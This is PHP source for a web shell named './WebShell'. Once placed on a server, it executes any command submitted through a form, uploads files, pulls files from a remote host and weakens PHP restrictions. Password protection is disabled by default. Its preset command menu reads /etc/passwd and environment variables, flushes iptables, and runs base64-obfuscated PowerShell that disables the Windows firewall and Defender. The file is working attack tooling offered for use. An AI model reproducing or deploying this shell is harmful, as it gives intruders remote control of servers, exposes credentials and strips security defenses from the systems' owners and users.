#<?php
define('passauth', False);
$autolog = False;
$passprompt = '';
$passhash = passauth ? '' : '';
function e($s) {
    echo htmlspecialchars($s, ENT_QUOTES);}
function h($s) {
    global $passprompt;
    if (function_exists('hash_hmac')) {
        return hash_hmac('sha512', $s, $passprompt);
    } else {
        return bin2hex(mhash(MHASH_SHA512, $s, $passprompt));}}
function fetch_fopen($host, $port, $src, $dst) {
    global $err, $ok;
    $ret = '';
    if (strpos($host, '://') === false) {
        $host = 'http://'. $host;
    } else {
        $host = str_replace(array('ssl://', 'tls://'), 'https://', $host);}
    $rh = fopen("${host}:${port}${src}", 'rb');
    if ($rh!== false) {
        $wh = fopen($dst, 'wb');
        if ($wh!== false) {
            $cbytes = 0;
            while (!feof($rh)) {
                $cbytes += fwrite($wh, fread($rh, 1024));}
            fclose($wh);
            $ret.= "${ok} Fetched file <i>${dst}</i> (${cbytes} bytes)<br />";
        } else {
            $ret.= "${err} Failed to open file <i>${dst}</i><br />";}
        fclose($rh);
    } else {
        $ret.= "${err} Failed to open URL <i>${host}:${port}${src}</i><br />";}
    return $ret;}
function fetch_sock($host, $port, $src, $dst) {
    global $err, $ok;
    $ret = '';
    $host = str_replace('https://', 'tls://', $host);
    $s = fsockopen($host, $port);
    if ($s) {
        $f = fopen($dst, 'wb');
        if ($f) {
            $buf = '';
            $r = array($s);
            $w = NULL;
            $e = NULL;
            fwrite($s, "GET ${src} HTTP/1.0\r\n\r\n");
            while (stream_select($r, $w, $e, 5) &&!feof($s)) {
                $buf.= fread($s, 1024);}
            $buf = substr($buf, strpos($buf, "\r\n\r\n") + 4);
            fwrite($f, $buf);
            fclose($f);
            $ret.= "${ok} Fetched file <i>${dst}</i> (". strlen($buf). " bytes)<br />";
        } else {
            $ret.= "${err} Failed to open file <i>${dst}</i><br />";}
        fclose($s);
    } else {
        $ret.= "${err} Failed to connect to <i>${host}:${port}</i><br />";}
    return $ret;}
ini_set('log_errors', '0');
ini_set('display_errors', '1');
error_reporting(E_ALL);
while (@ob_end_clean());
if (!isset($_SERVER)) {
    global $HTTP_POST_FILES, $HTTP_POST_VARS, $HTTP_SERVER_VARS;
    $_FILES =& $HTTP_POST_FILES;
    $_POST =& $HTTP_POST_VARS;
    $_SERVER =& $HTTP_SERVER_VARS;}
$auth = '';
$cmd = empty($_POST['cmd'])? '' : $_POST['cmd'];
$cwd = empty($_POST['cwd'])? getcwd() : $_POST['cwd'];
$fetch_func = 'fetch_fopen';
$fetch_host = empty($_POST['fetch_host'])? $_SERVER['REMOTE_ADDR'] : $_POST['fetch_host'];
$fetch_path = empty($_POST['fetch_path'])? '' : $_POST['fetch_path'];
$fetch_port = empty($_POST['fetch_port'])? '80' : $_POST['fetch_port'];
$pass = empty($_POST['pass'])? '' : $_POST['pass'];
$url = $_SERVER['REQUEST_URI'];
$status = '$ '. $cmd . "\n";
$ok = 'OK: ';
$warn = 'WARNING: ';
$err = 'ERROR: ';
if (!passauth && $autolog) {
  $autolog = false;}
if (!$autolog) {
} else {?>
  <script>
    setTimeout(function() {
      alert('Automatically logging out in 1 minute');
    }, 840000);
    setTimeout(function() {
      window.location.href = 'shell.php';
      alert('Logging out for security');
    }, 900000);
  </script><?php
}if (passauth &&!empty($passhash)) {
    if (function_exists('hash_hmac') || function_exists('mhash')) {
        $auth = empty($_POST['auth'])? h($pass) : $_POST['auth'];
        if (h($auth)!== $passhash) {
          ?><head><title>./WebShell</title></head><style>
                input[type="text"], input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    margin: 5px;
                    border: 1px solid #ccc;}
                input[type="submit"] {
                    background-color: #4CAF50;
                    color: #fff;
                    padding: 10px 20px;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;}
                input[type="submit"]:hover {
                    background-color: #3e8e41;}</style>
            <form action="<?php e($url);?>" method="post">
                <h3><?php e($passprompt);?></h3>
                <input name="pass" size="30" type="password"> 
                <input value="  Login  " type="submit"></form>
            <?php exit;}
    } else {
        $status.= "${warn} Password disabled.<br />";}}
if (!ini_get('allow_url_fopen')) {
    ini_set('allow_url_fopen', '1');
    if (!ini_get('allow_url_fopen')) {
        if (function_exists('stream_select')) {
            $fetch_func = 'fetch_sock';
        } else {
            $fetch_func = '';
            $status.= "${warn} File fetching disabled ('allow_url_fopen' disabled and 'tream_select()' missing).<br />";}}}
if (!ini_get('file_uploads')) {
    ini_set('file_uploads', '1');
    if (!ini_get('file_uploads')) {
        $status.= "${warn} File uploads disabled.<br />";}}
if (ini_get('open_basedir') &&!ini_set('open_basedir', '')) {
    $status.= "${warn} open_basedir = ". ini_get('open_basedir'). "<br />";}
if (!chdir($cwd)) {
    $cwd = getcwd();}
if (!empty($fetch_func) &&!empty($fetch_path)) {
    $dst = $cwd. DIRECTORY_SEPARATOR. basename($fetch_path);
    $status.= $fetch_func($fetch_host, $fetch_port, $fetch_path, $dst);}
if (ini_get('file_uploads') &&!empty($_FILES['upload'])) {
    $dest = $cwd. DIRECTORY_SEPARATOR. basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
        $status.= "${ok} Uploaded file <i>${dest}</i> (". $_FILES['upload']['size']. " bytes)<br />";}}
?>
<form action="<?php e($url);?>" method="post" enctype="multipart/form-data"<?php if (ini_get('file_uploads')):?><?php endif;?>>
<head><title>./WebShell</title></head><h2>./WebShell</h2>
<?php if (!passauth):?>
  <p style="color: red;">WARNING! Password disabled. Anyone can execute commands.</p>
<?php else:?>
  <p style="color: green;">Password protected.</p>
<?php endif;?>
<p>Auto-logout is <span style="color: <?= $autolog? 'green' : 'red';?>"><?= $autolog? 'enabled' . ' every 15 minutes' : 'disabled';?></span></p>
    <?php if (!empty($passhash)):?>
        <input name="auth" type="hidden" value="<?php e($auth);?>">
    <?php endif;?>
    <table border="0">
        <?php if (!empty($fetch_func)):?>
            <tr><td><b>Fetch:</b></td>
                <td>host: <input name="fetch_host" id="fetch_host" size="15" value="<?php e($fetch_host);?>"> 
                    port: <input name="fetch_port" id="fetch_port" size="4" value="<?php e($fetch_port);?>"> 
                    path: <input name="fetch_path" id="fetch_path" size="40" value=""></td></tr>
        <?php endif;?>
    <tr><td><b>CWD:</b></td>
      <td><input name="cwd" id="cwd" size="50" value="<?php e($cwd);?>">
        <?php if (ini_get('file_uploads')):?>
          <b>Upload:</b> <input name="upload" id="upload" type="file">
        <?php endif;?></td></tr>
    <tr><td><b>Command:</b></td>
      <td><input name="cmd" id="cmd" size="55" value="<?php e($cmd);?>">
        <select id="auto_cmds" onchange="fillCmd(this.value)">
          <option value="">Auto commands</option>
          <?php if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'):?>
            <optgroup label="Windows">
              <option value="echo User Info: & whoami & echo User Info Detailed: & whoami /all & echo Session Info: & qwinsta & echo Net User Info: & net user">Show all groups/users</option>
              <option value="echo IPv4 Configuration: & netsh interface ipv4 show config & echo WLAN Profiles: & netsh wlan show profiles">Show network information</option>
              <option value="tasklist">Show tasks</option>
              <option value="driverquery | findstr Kernel">Show kernal drivers</option>
              <option value="fsutil fsinfo drives">Show all drives</option>
              <option value="set">Show enviroment vars</option>
              <option value="curl checkip.amazonaws.com">Get public IP address</option>
              <option value="powershell -ExecutionPolicy Bypass -Command Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9mZjtzYyBzdG9wIFdpbkRlZmVuZA==')))">(admin, b64) Disable Firewall+WinDefender</option>
              <option value="powershell -ExecutionPolicy Bypass -Command Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9uO3NjIHN0YXJ0IFdpbkRlZmVuZA==')))">(admin, b64) Restore Firewall+WinDefender</option></optgroup>
          <?php else:?>
            <optgroup label="Linux">
              <option value="echo Whoami:;whoami;echo \\nUsers Logged On:;w;echo \\nUser ID:;id;echo \\n/etc/passwd Contents:;cat /etc/passwd
">Show all groups/users</option>
              <option value="echo Network Connections:;nmcli con show;echo \\nInterfaces:;ifconfig;echo \\nWireless Interfaces:;iwconfig">Show network information</option>
              <option value="lsof">Show all processes(SLOW)</option>
              <option value="(ps aux --sort=-%cpu | head -n 26; ps aux --sort=-%mem | head -n 26) | sort -rnk 3,4 | uniq -f 10 | head -n 25">Show most active processes</option>
              <option value="echo Kernel boot commands:;cat /proc/cmdline;echo Kernel parameters:;lsmod;sysctl -a">Show kernal information</option>
              <option value="df -h">Show all drives</option>
              <option value="printenv">Show enviroment vars</option>
              <option value="curl checkip.amazonaws.com">Get public IP address</option>
              <option value="sudo iptables -L > iptables.backup;sudo iptables -F">(sudo) Disable firewall</option>
              <option value="sudo iptables-restore < iptables.backup">(sudo) Restore firewall</option></optgroup><?php endif;?></select></td></tr>
    <tr><td colspan="2">
        <input type="submit" value="  Execute  "></td></tr></table></form>
<script>
  function fillCmd(cmd) {
    document.getElementById('cmd').value = cmd;
  }</script>
<pre><?php
if (!empty($status)) {
    e($status);}
if (!empty($cmd)) {
    $cmd = trim($cmd);
    if (empty($cmd)) {
        $status.= "${warn} Empty command.<br />";
    } else {
        $res = array();
        $descriptorspec = array(
            0 => array('pipe', 'r'),
            1 => array('pipe', 'w'),
            2 => array('pipe', 'w'),);
        $process = proc_open($cmd, $descriptorspec, $pipes, $cwd);
        if (is_resource($process)) {
            fwrite($pipes[0], '<?php die(); ?>' . PHP_EOL);
            fclose($pipes[0]);
            $res['stdout'] = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $res['stderr'] = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            proc_close($process);
            if ($res['stdout']) {
                $res['stdout'] = htmlspecialchars($res['stdout'], ENT_QUOTES);}
            if ($res['stderr']) {
                $res['stderr'] = htmlspecialchars($res['stderr'], ENT_QUOTES);}
            if (!empty($res['stdout'])) {
                e($res['stdout']);}
            if (!empty($res['stderr'])) {
                e($res['stderr']);}
        } else {
            $status.= "${err} Failed to execute command.<br />";}}}?></pre>